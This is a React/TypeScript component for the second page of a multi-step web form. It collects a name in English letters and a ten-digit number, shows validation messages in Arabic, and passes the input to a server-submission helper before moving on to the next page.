import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import { currentPage, sendDataToServer } from "../../context/signals";

function Page2() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    sendDataToServer(data, "page2", "page3", true);
  }

  useEffect(() => {
    currentPage.value = "page2";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <Input
          errors={errors}
          register={register}
          id="name"
          label="name"
          options={{
            required: "هذا الحقل ضروري",

            validate: (val) => {
              const nameWithoutSpaces = val.replace(/\s/g, "");
              if (!/^[a-zA-Z]*$/.test(nameWithoutSpaces))
                return "يجب كتابة الاسم بلغة الإنجليزية";
            },
          }}
        />
        <Input
          errors={errors}
          register={register}
          id="number"
          label="number"
          type="number"
          options={{
            required: "هذا الحقل ضروري",
            pattern: {
              value: /^[0-9]{10}$/,
              message: "يجب كتابة عشر أرقام",
            },
          }}
        />

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>next</Button>
      </form>
    </Main>
  );
}

export default Page2;
